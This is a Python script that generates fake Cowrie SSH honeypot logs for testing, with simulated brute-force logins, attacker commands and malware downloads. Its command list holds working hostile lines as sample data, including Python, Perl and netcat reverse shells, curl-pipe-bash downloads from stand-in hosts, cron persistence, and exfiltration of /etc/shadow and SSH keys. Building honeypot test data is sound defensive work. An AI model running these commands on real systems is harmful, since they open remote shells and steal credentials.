#!/usr/bin/env python3
"""Generate sample Cowrie honeypot log data for testing."""

import json
import random
from datetime import datetime, timedelta

# Sample data pools
ATTACKER_IPS = [
    "185.220.101.42", "198.51.100.15", "203.0.113.78", "192.0.2.134",
    "103.253.145.12", "91.207.175.22", "176.123.8.91", "45.142.212.66",
    "23.129.64.15", "185.220.102.7", "107.189.14.89", "194.32.107.52",
    "5.2.76.22", "198.98.49.201", "51.15.127.30", "185.220.101.180",
    "193.32.126.77", "37.120.215.242", "185.220.100.240", "209.141.45.67",
    "104.244.72.115", "198.98.57.207", "199.195.250.77", "185.220.101.24",
    "185.220.101.32", "91.203.5.146", "45.154.168.123", "185.220.101.16",
    "198.98.61.99", "185.220.101.8"
]

USERNAMES = [
    "root", "admin", "test", "user", "oracle", "postgres", "mysql",
    "ubuntu", "centos", "debian", "ftp", "www", "guest", "support",
    "service", "operator", "manager", "webadmin", "administrator",
    "cisco", "default", "nagios", "pi", "hadoop", "jenkins", "tomcat"
]

PASSWORDS = [
    "123456", "password", "root", "admin", "123456789", "qwerty",
    "12345678", "12345", "1234567", "123123", "111111", "abc123",
    "letmein", "welcome", "password123", "root123", "admin123",
    "123qwe", "qwerty123", "1q2w3e", "ubuntu", "centos", "debian",
    "raspberry", "hadoop", "jenkins", "tomcat", "cisco", "enable"
]

COMMANDS = [
    "uname -a", "cat /etc/passwd", "cat /proc/cpuinfo", "ls -la",
    "whoami", "id", "wget http://evil.com/malware.sh -O /tmp/x",
    "curl -s http://185.220.101.42/botnet.sh | bash",
    "chmod +x /tmp/x", "./tmp/x", "rm -rf /tmp/*",
    "cat /etc/os-release", "ps aux", "netstat -an", "ifconfig",
    "ip addr", "route -n", "cat /proc/version", "free -m",
    "df -h", "uptime", "w", "last", "history",
    "wget http://103.253.145.12/miner -O /usr/bin/systemd-worker",
    "curl -o /tmp/update http://198.51.100.15/update.sh",
    "chmod 777 /usr/bin/systemd-worker", "/usr/bin/systemd-worker &",
    "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
    "crontab -l", "echo '* * * * * curl http://evil.com/persist.sh | bash' | crontab -",
    "cat ~/.ssh/authorized_keys", "ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa",
    "scp /etc/passwd attacker@203.0.113.78:/data/",
    "tar czf - /etc | nc 185.220.101.42 9999",
    "curl -F 'file=@/etc/shadow' http://91.207.175.22/upload.php",
    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"185.220.101.42\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "perl -e 'use Socket;$i=\"185.220.101.42\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "nc -e /bin/sh 185.220.101.42 4444",
    "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 185.220.101.42 4444 > /tmp/f",
    "base64 -d <<< 'Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo' | bash",
    "/bin/busybox wget http://198.51.100.15/botnet -O /tmp/botnet",
    "dd if=/dev/zero of=/dev/null bs=1M count=100",
    "cat /etc/shadow", "find / -name '*.key' 2>/dev/null",
    "find / -name '*.pem' 2>/dev/null", "find / -name 'id_rsa' 2>/dev/null",
    "cat /root/.ssh/id_rsa", "cat /home/*/.ssh/id_rsa",
    "ls -la /root/.ssh/", "ls -la /home/*/.ssh/",
    "systemctl list-units", "systemctl status ssh", "service --status-all",
    "cat /var/log/auth.log", "cat /var/log/secure",
    "lastb", "faillog", "tail -100 /var/log/syslog"
]

MALWARE_URLS = [
    "http://185.220.101.42/mirai.x86",
    "http://198.51.100.15/botnet.sh",
    "http://103.253.145.12/miner",
    "http://203.0.113.78/payload.elf",
    "http://91.207.175.22/update.sh",
    "http://176.123.8.91/xmrig",
    "http://45.142.212.66/shell.php",
    "http://23.129.64.15/backdoor.py",
    "http://107.189.14.89/rootkit.so",
    "http://194.32.107.52/persist.sh"
]

MALWARE_FILES = [
    "mirai.x86", "botnet.sh", "miner", "payload.elf", "update.sh",
    "xmrig", "shell.php", "backdoor.py", "rootkit.so", "persist.sh",
    "systemd-worker", "kworker", "network-manager", "update-service"
]

def generate_timestamp(hours_back=None):
    """Generate a timestamp within the last 48 hours."""
    if hours_back is None:
        hours_back = random.uniform(0, 48)
    return datetime.utcnow() - timedelta(hours=hours_back)

def generate_session_id():
    """Generate a random session ID."""
    return ''.join(random.choices('abcdef0123456789', k=16))

def create_event(eventid, timestamp, session, src_ip, **kwargs):
    """Create a base event structure."""
    event = {
        "eventid": eventid,
        "timestamp": timestamp.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "session": session,
        "src_ip": src_ip,
        "sensor": "honeypot-ct100",
        "dst_ip": "10.0.0.5",
        "dst_port": 2222
    }
    event.update(kwargs)
    return event

def generate_session(src_ip, start_time, session_id):
    """Generate a complete attack session."""
    events = []
    current_time = start_time
    session_duration = random.randint(60, 3600)  # 1 min to 1 hour
    
    # Session connect
    events.append(create_event(
        "cowrie.session.connect",
        current_time,
        session_id,
        src_ip,
        protocol="ssh",
        src_port=random.randint(40000, 60000)
    ))
    
    # Client version
    current_time += timedelta(seconds=random.uniform(0.1, 2))
    events.append(create_event(
        "cowrie.client.version",
        current_time,
        session_id,
        src_ip,
        version="SSH-2.0-OpenSSH_7.4"
    ))
    
    # Login attempts
    num_attempts = random.choices([1, 2, 3, 5, 10, 20], weights=[30, 25, 20, 15, 7, 3])[0]
    successful_login = random.random() < 0.15  # 15% success rate
    successful_creds = None
    
    for i in range(num_attempts):
        current_time += timedelta(seconds=random.uniform(1, 10))
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        
        # Check if this attempt succeeds
        if successful_login and i == num_attempts - 1:
            events.append(create_event(
                "cowrie.login.success",
                current_time,
                session_id,
                src_ip,
                username=username,
                password=password
            ))
            successful_creds = (username, password)
        else:
            events.append(create_event(
                "cowrie.login.failed",
                current_time,
                session_id,
                src_ip,
                username=username,
                password=password
            ))
    
    # Post-login activity (only if successful)
    if successful_login and successful_creds:
        num_commands = random.choices([1, 3, 5, 10, 20, 50], weights=[20, 25, 25, 15, 10, 5])[0]
        
        for _ in range(num_commands):
            current_time += timedelta(seconds=random.uniform(0.5, 30))
            command = random.choice(COMMANDS)
            
            events.append(create_event(
                "cowrie.command.input",
                current_time,
                session_id,
                src_ip,
                input=command
            ))
            
            # Sometimes command fails
            if random.random() < 0.1:
                current_time += timedelta(seconds=random.uniform(0.1, 1))
                events.append(create_event(
                    "cowrie.command.failed",
                    current_time,
                    session_id,
                    src_ip,
                    input=command
                ))
            
            # Sometimes malware download
            if random.random() < 0.15:
                current_time += timedelta(seconds=random.uniform(0.5, 5))
                url = random.choice(MALWARE_URLS)
                filename = random.choice(MALWARE_FILES)
                events.append(create_event(
                    "cowrie.session.file_download",
                    current_time,
                    session_id,
                    src_ip,
                    url=url,
                    filename=filename,
                    shasum=''.join(random.choices('abcdef0123456789', k=64))
                ))
    
    # Session close
    current_time += timedelta(seconds=random.uniform(1, 30))
    events.append(create_event(
        "cowrie.session.closed",
        current_time,
        session_id,
        src_ip,
        duration=(current_time - start_time).total_seconds()
    ))
    
    return events

def generate_logs(output_file, num_sessions=200):
    """Generate complete log file."""
    all_events = []
    
    # Generate sessions spread over last 48 hours
    for _ in range(num_sessions):
        src_ip = random.choice(ATTACKER_IPS)
        hours_back = random.uniform(0, 48)
        start_time = generate_timestamp(hours_back)
        session_id = generate_session_id()
        
        session_events = generate_session(src_ip, start_time, session_id)
        all_events.extend(session_events)
    
    # Sort by timestamp
    all_events.sort(key=lambda x: x["timestamp"])
    
    # Write to file
    with open(output_file, 'w') as f:
        for event in all_events:
            f.write(json.dumps(event) + '\n')
    
    print(f"Generated {len(all_events)} events across {num_sessions} sessions")
    return len(all_events)

if __name__ == '__main__':
    import sys
    output = sys.argv[1] if len(sys.argv) > 1 else '/var/log/cowrie/cowrie.json'
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 200
    generate_logs(output, count)
